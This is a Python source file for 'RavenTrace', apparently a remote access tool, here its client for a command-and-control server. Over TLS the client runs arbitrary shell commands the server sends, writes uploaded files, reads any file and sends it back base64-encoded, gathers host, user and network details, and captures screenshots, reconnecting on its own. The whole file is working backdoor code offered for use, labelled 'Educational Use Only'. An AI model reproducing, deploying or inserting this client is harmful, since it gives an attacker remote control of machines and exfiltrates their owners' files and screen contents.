#!/usr/bin/env python3
"""
RavenTrace - Client Module

This module implements a secure client for RavenTrace, allowing secure
communication with the command and control server over SSL/TLS with
proper authentication and encryption.

Author: RavenTrace Team
Version: 1.0.0
License: Educational Use Only
"""

import argparse
import json
import logging
import os
import platform
import socket
import ssl
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Union, Callable

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("raventrace_client.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("raventrace.client")


@dataclass
class ClientConfig:
    """Configuration dataclass for the RavenTrace client."""
    server_host: str
    server_port: int = 8443
    cert_file: Optional[str] = None
    key_file: Optional[str] = None
    ca_file: Optional[str] = None
    verify_ssl: bool = True
    reconnect_interval: int = 30
    max_reconnect_attempts: int = 10
    heartbeat_interval: int = 60
    log_file: str = "raventrace_client.log"


class CommandExecutor:
    """
    Command executor for the RavenTrace client.
    
    This class handles the execution of commands received from the server.
    """
    
    def __init__(self):
        """Initialize the command executor."""
        # Register command handlers
        self.command_handlers = {
            "shell": self._handle_shell_command,
            "upload": self._handle_upload_command,
            "download": self._handle_download_command,
            "info": self._handle_info_command,
            "screenshot": self._handle_screenshot_command,
            "exit": self._handle_exit_command
        }
        
    def execute_command(self, command: Dict) -> Dict:
        """
        Execute a command.
        
        Args:
            command: The command to execute
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract command type
            command_type = command.get("type")
            
            if not command_type:
                return {
                    "status": "error",
                    "message": "Missing command type"
                }
                
            # Get command handler
            handler = self.command_handlers.get(command_type)
            
            if not handler:
                return {
                    "status": "error",
                    "message": f"Unsupported command type: {command_type}"
                }
                
            # Execute command
            return handler(command)
            
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                "status": "error",
                "message": f"Command execution error: {str(e)}"
            }
            
    def _handle_shell_command(self, command: Dict) -> Dict:
        """
        Handle a shell command.
        
        Args:
            command: The shell command
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract command
            shell_command = command.get("command")
            
            if not shell_command:
                return {
                    "status": "error",
                    "message": "Missing shell command"
                }
                
            # Execute command
            logger.info(f"Executing shell command: {shell_command}")
            
            # Use subprocess to execute command
            process = subprocess.run(
                shell_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=command.get("timeout", 60)
            )
            
            # Return result
            return {
                "status": "success",
                "exit_code": process.returncode,
                "stdout": process.stdout,
                "stderr": process.stderr
            }
            
        except subprocess.TimeoutExpired:
            return {
                "status": "error",
                "message": "Command timed out"
            }
        except Exception as e:
            logger.error(f"Error executing shell command: {e}")
            return {
                "status": "error",
                "message": f"Shell command error: {str(e)}"
            }
            
    def _handle_upload_command(self, command: Dict) -> Dict:
        """
        Handle a file upload command.
        
        Args:
            command: The upload command
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract file data and path
            file_data = command.get("data")
            file_path = command.get("path")
            
            if not file_data or not file_path:
                return {
                    "status": "error",
                    "message": "Missing file data or path"
                }
                
            # Decode file data
            try:
                import base64
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Invalid file data: {str(e)}"
                }
                
            # Write file
            try:
                # Create directory if it doesn't exist
                os.makedirs(os.path.dirname(os.path.abspath(file_path)), exist_ok=True)
                
                with open(file_path, "wb") as f:
                    f.write(decoded_data)
                    
                logger.info(f"Uploaded file to {file_path}")
                
                return {
                    "status": "success",
                    "message": f"File uploaded to {file_path}",
                    "size": len(decoded_data)
                }
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Error writing file: {str(e)}"
                }
                
        except Exception as e:
            logger.error(f"Error handling upload command: {e}")
            return {
                "status": "error",
                "message": f"Upload error: {str(e)}"
            }
            
    def _handle_download_command(self, command: Dict) -> Dict:
        """
        Handle a file download command.
        
        Args:
            command: The download command
            
        Returns:
            Dict: The command result
        """
        try:
            # Extract file path
            file_path = command.get("path")
            
            if not file_path:
                return {
                    "status": "error",
                    "message": "Missing file path"
                }
                
            # Read file
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                    
                # Encode file data
                import base64
                encoded_data = base64.b64encode(file_data).decode("utf-8")
                
                logger.info(f"Downloaded file from {file_path}")
                
                return {
                    "status": "success",
                    "message": f"File downloaded from {file_path}",
                    "size": len(file_data),
                    "data": encoded_data,
                    "filename": os.path.basename(file_path)
                }
            except FileNotFoundError:
                return {
                    "status": "error",
                    "message": f"File not found: {file_path}"
                }
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Error reading file: {str(e)}"
                }
                
        except Exception as e:
            logger.error(f"Error handling download command: {e}")
            return {
                "status": "error",
                "message": f"Download error: {str(e)}"
            }
            
    def _handle_info_command(self, command: Dict) -> Dict:
        """
        Handle an information command.
        
        Args:
            command: The info command
            
        Returns:
            Dict: The command result
        """
        try:
            # Collect system information
            info = {
                "hostname": socket.gethostname(),
                "platform": platform.platform(),
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "username": os.getlogin(),
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "python_version": platform.python_version(),
                "time": datetime.now().isoformat()
            }
            
            # Add network interfaces
            try:
                import netifaces
                interfaces = {}
                
                for interface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(interface)
                    
                    if netifaces.AF_INET in addrs:
                        interfaces[interface] = {
                            "ipv4": addrs[netifaces.AF_INET][0]["addr"],
                            "netmask": addrs[netifaces.AF_INET][0]["netmask"]
                        }
                        
                        if netifaces.AF_LINK in addrs:
                            interfaces[interface]["mac"] = addrs[netifaces.AF_LINK][0]["addr"]
                            
                info["interfaces"] = interfaces
            except ImportError:
                # netifaces not available
                pass
                
            logger.info("Collected system information")
            
            return {
                "status": "success",
                "info": info
            }
            
        except Exception as e:
            logger.error(f"Error handling info command: {e}")
            return {
                "status": "error",
                "message": f"Info error: {str(e)}"
            }
            
    def _handle_screenshot_command(self, command: Dict) -> Dict:
        """
        Handle a screenshot command.
        
        Args:
            command: The screenshot command
            
        Returns:
            Dict: The command result
        """
        try:
            # Check if PIL is available
            try:
                from PIL import ImageGrab
            except ImportError:
                return {
                    "status": "error",
                    "message": "Screenshot functionality requires PIL/Pillow"
                }
                
            # Take screenshot
            try:
                screenshot = ImageGrab.grab()
                
                # Save to temporary file
                import tempfile
                import base64
                
                with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
                    temp_path = temp.name
                    screenshot.save(temp_path)
                    
                # Read and encode screenshot
                with open(temp_path, "rb") as f:
                    screenshot_data = f.read()
                    
                # Clean up temporary file
                os.unlink(temp_path)
                
                # Encode screenshot data
                encoded_data = base64.b64encode(screenshot_data).decode("utf-8")
                
                logger.info("Captured screenshot")
                
                return {
                    "status": "success",
                    "message": "Screenshot captured",
                    "size": len(screenshot_data),
                    "data": encoded_data,
                    "width": screenshot.width,
                    "height": screenshot.height
                }
            except Exception as e:
                return {
                    "status": "error",
                    "message": f"Error capturing screenshot: {str(e)}"
                }
                
        except Exception as e:
            logger.error(f"Error handling screenshot command: {e}")
            return {
                "status": "error",
                "message": f"Screenshot error: {str(e)}"
            }
            
    def _handle_exit_command(self, command: Dict) -> Dict:
        """
        Handle an exit command.
        
        Args:
            command: The exit command
            
        Returns:
            Dict: The command result
        """
        try:
            # Return success and set exit flag
            logger.info("Received exit command")
            
            return {
                "status": "success",
                "message": "Client exiting",
                "exit": True
            }
            
        except Exception as e:
            logger.error(f"Error handling exit command: {e}")
            return {
                "status": "error",
                "message": f"Exit error: {str(e)}"
            }


class RavenTraceClient:
    """
    Main client class for RavenTrace.
    
    This class implements a secure client for communicating with the
    RavenTrace command and control server.
    """
    
    def __init__(self, config: ClientConfig):
        """
        Initialize the client with the given configuration.
        
        Args:
            config: Client configuration
        """
        self.config = config
        self.socket = None
        self.ssl_socket = None
        self.ssl_context = None
        self.running = False
        self.authenticated = False
        self.client_id = None
        self.command_executor = CommandExecutor()
        self.reconnect_attempts = 0
        self.last_heartbeat = time.time()
        
    def start(self) -> None:
        """Start the client."""
        try:
            # Set running flag
            self.running = True
            
            # Connect to server
            self._connect()
            
            # Main loop
            while self.running:
                try:
                    # Check if connected
                    if not self.ssl_socket:
                        # Attempt to reconnect
                        if not self._reconnect():
                            break
                            
                    # Check if authenticated
                    if not self.authenticated:
                        # Attempt to authenticate
                        if not self._authenticate():
                            # Authentication failed, reconnect
                            self._disconnect()
                            continue
                            
                    # Check if heartbeat is needed
                    if time.time() - self.last_heartbeat > self.config.heartbeat_interval:
                        self._send_heartbeat()
                        
                    # Receive and process command
                    command = self._receive_message()
                    
                    if command:
                        # Execute command
                        result = self.command_executor.execute_command(command)
                        
                        # Send result
                        self._send_message(result)
                        
                        # Check if exit command
                        if result.get("exit"):
                            logger.info("Exiting due to exit command")
                            self.running = False
                            break
                    else:
                        # No command, sleep briefly
                        time.sleep(0.1)
                        
                except (socket.timeout, ConnectionResetError, BrokenPipeError) as e:
                    logger.warning(f"Connection error: {e}")
                    self._disconnect()
                except Exception as e:
                    logger.error(f"Error in main loop: {e}")
                    self._disconnect()
                    
        except KeyboardInterrupt:
            logger.info("Client interrupted by user")
        except Exception as e:
            logger.error(f"Error starting client: {e}")
        finally:
            self._cleanup()
            
    def stop(self) -> None:
        """Stop the client."""
        logger.info("Stopping client...")
        self.running = False
        self._cleanup()
        
    def _cleanup(self) -> None:
        """Clean up client resources."""
        try:
            # Disconnect from server
            self._disconnect()
            
            logger.info("Client stopped")
            
        except Exception as e:
            logger.error(f"Error cleaning up client: {e}")
            
    def _create_ssl_context(self) -> ssl.SSLContext:
        """
        Create an SSL context for the client.
        
        Returns:
            ssl.SSLContext: The SSL context
        """
        try:
            # Create SSL context
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            
            # Configure verification
            if not self.config.verify_ssl:
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                logger.warning("SSL certificate verification disabled")
                
            # Load CA certificate if provided
            if self.config.ca_file:
                context.load_verify_locations(cafile=self.config.ca_file)
                
            # Load client certificate and key if provided
            if self.config.cert_file and self.config.key_file:
                context.load_cert_chain(certfile=self.config.cert_file, keyfile=self.config.key_file)
                
            # Configure security options
            context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # Disable TLS 1.0 and 1.1
            context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
            
            return context
            
        except Exception as e:
            logger.error(f"Error creating SSL context: {e}")
            raise
            
    def _connect(self) -> bool:
        """
        Connect to the server.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Create SSL context
            self.ssl_context = self._create_ssl_context()
            
            # Create socket
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            
            # Connect to server
            logger.info(f"Connecting to {self.config.server_host}:{self.config.server_port}")
            self.socket.connect((self.config.server_host, self.config.server_port))
            
            # Wrap with SSL
            self.ssl_socket = self.ssl_context.wrap_socket(
                self.socket,
                server_hostname=self.config.server_host
            )
            
            logger.info(f"Connected to {self.config.server_host}:{self.config.server_port}")
            
            # Reset reconnect attempts
            self.reconnect_attempts = 0
            
            return True
            
        except Exception as e:
            logger.error(f"Connection error: {e}")
            self._disconnect()
            return False
            
    def _disconnect(self) -> None:
        """Disconnect from the server."""
        try:
            # Close SSL socket
            if self.ssl_socket:
                self.ssl_socket.close()
                self.ssl_socket = None
                
            # Close socket
            if self.socket:
                self.socket.close()
                self.socket = None
                
            # Reset authentication
            self.authenticated = False
            self.client_id = None
            
            logger.info("Disconnected from server")
            
        except Exception as e:
            logger.error(f"Error disconnecting: {e}")
            
    def _reconnect(self) -> bool:
        """
        Attempt to reconnect to the server.
        
        Returns:
            bool: True if successful, False otherwise
        """
        # Check if maximum reconnect attempts reached
        if self.reconnect_attempts >= self.config.max_reconnect_attempts:
            logger.error(f"Maximum reconnect attempts ({self.config.max_reconnect_attempts}) reached")
            self.running = False
            return False
            
        # Increment reconnect attempts
        self.reconnect_attempts += 1
        
        # Wait before reconnecting
        logger.info(f"Reconnecting in {self.config.reconnect_interval} seconds (attempt {self.reconnect_attempts}/{self.config.max_reconnect_attempts})")
        time.sleep(self.config.reconnect_interval)
        
        # Attempt to connect
        return self._connect()
        
    def _authenticate(self) -> bool:
        """
        Authenticate with the server.
        
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Receive authentication challenge
            challenge = self._receive_message()
            
            if not challenge or challenge.get("type") != "auth_challenge":
                logger.warning("Invalid authentication challenge")
                return False
                
            # Prepare authentication response
            response = {
                "type": "auth_response",
                "hostname": socket.gethostname(),
                "username": os.getlogin(),
                "os_info": platform.platform(),
                "challenge": challenge.get("challenge")
            }
            
            # Send authentication response
            self._send_message(response)
            
            # Receive authentication result
            result = self._receive_message()
            
            if not result or result.get("type") != "auth_result":
                logger.warning("Invalid authentication result")
                return False
                
            # Check if authentication successful
            if result.get("success"):
                self.authenticated = True
                self.client_id = result.get("client_id")
                logger.info(f"Authentication successful, client ID: {self.client_id}")
                return True
            else:
                logger.warning(f"Authentication failed: {result.get('message', 'Unknown error')}")
                return False
                
        except Exception as e:
            logger.error(f"Authentication error: {e}")
            return False
            
    def _send_message(self, message: Dict) -> bool:
        """
        Send a message to the server.
        
        Args:
            message: The message to send
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Convert message to JSON
            message_json = json.dumps(message)
            
            # Add message length prefix
            message_bytes = message_json.encode('utf-8')
            length_prefix = len(message_bytes).to_bytes(4, byteorder='big')
            
            # Send length prefix and message
            self.ssl_socket.sendall(length_prefix + message_bytes)
            return True
            
        except Exception as e:
            logger.error(f"Error sending message: {e}")
            raise
            
    def _receive_message(self) -> Optional[Dict]:
        """
        Receive a message from the server.
        
        Returns:
            Optional[Dict]: The received message or None if error
        """
        try:
            # Receive message length
            length_prefix = self.ssl_socket.recv(4)
            if not length_prefix or len(length_prefix) < 4:
                logger.warning("Connection closed by server")
                return None
                
            # Parse message length
            message_length = int.from_bytes(length_prefix, byteorder='big')
            
            # Sanity check on length
            if message_length > 10485760:  # 10MB max
                logger.warning(f"Message too large: {message_length} bytes")
                return None
                
            # Receive message data
            message_data = b""
            bytes_received = 0
            
            while bytes_received < message_length:
                chunk = self.ssl_socket.recv(min(4096, message_length - bytes_received))
                if not chunk:
                    logger.warning("Connection closed by server during message receive")
                    return None
                    
                message_data += chunk
                bytes_received += len(chunk)
                
            # Parse JSON message
            message_json = message_data.decode('utf-8')
            return json.loads(message_json)
            
        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON from server: {e}")
            return None
        except Exception as e:
            logger.error(f"Error receiving message: {e}")
            raise
            
    def _send_heartbeat(self) -> None:
        """Send a heartbeat to the server."""
        try:
            # Prepare heartbeat message
            heartbeat = {
                "type": "heartbeat",
                "timestamp": datetime.now().isoformat()
            }
            
            # Send heartbeat
            self._send_message(heartbeat)
            
            # Update last heartbeat time
            self.last_heartbeat = time.time()
            
            logger.debug("Sent heartbeat")
            
        except Exception as e:
            logger.error(f"Error sending heartbeat: {e}")
            # Connection error, disconnect
            self._disconnect()


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="RavenTrace Client")
    
    # Server options
    parser.add_argument("--host", required=True, help="Server host")
    parser.add_argument("--port", type=int, default=8443, help="Server port (default: 8443)")
    
    # SSL options
    parser.add_argument("--cert", help="Client certificate file")
    parser.add_argument("--key", help="Client key file")
    parser.add_argument("--ca", help="CA certificate file")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    
    # Connection options
    parser.add_argument("--reconnect-interval", type=int, default=30,
                       help="Reconnect interval in seconds (default: 30)")
    parser.add_argument("--max-reconnect", type=int, default=10,
                       help="Maximum reconnect attempts (default: 10)")
    parser.add_argument("--heartbeat-interval", type=int, default=60,
                       help="Heartbeat interval in seconds (default: 60)")
    
    # Other options
    parser.add_argument("--log-file", default="raventrace_client.log",
                       help="Log file (default: raventrace_client.log)")
    
    return parser.parse_args()


def main():
    """Main function for the client."""
    args = parse_arguments()
    
    # Create configuration
    config = ClientConfig(
        server_host=args.host,
        server_port=args.port,
        cert_file=args.cert,
        key_file=args.key,
        ca_file=args.ca,
        verify_ssl=not args.no_verify,
        reconnect_interval=args.reconnect_interval,
        max_reconnect_attempts=args.max_reconnect,
        heartbeat_interval=args.heartbeat_interval,
        log_file=args.log_file
    )
    
    # Create client
    client = RavenTraceClient(config)
    
    try:
        # Start client
        client.start()
    except KeyboardInterrupt:
        logger.info("Client interrupted by user")
    finally:
        # Stop client
        client.stop()


if __name__ == "__main__":
    main()
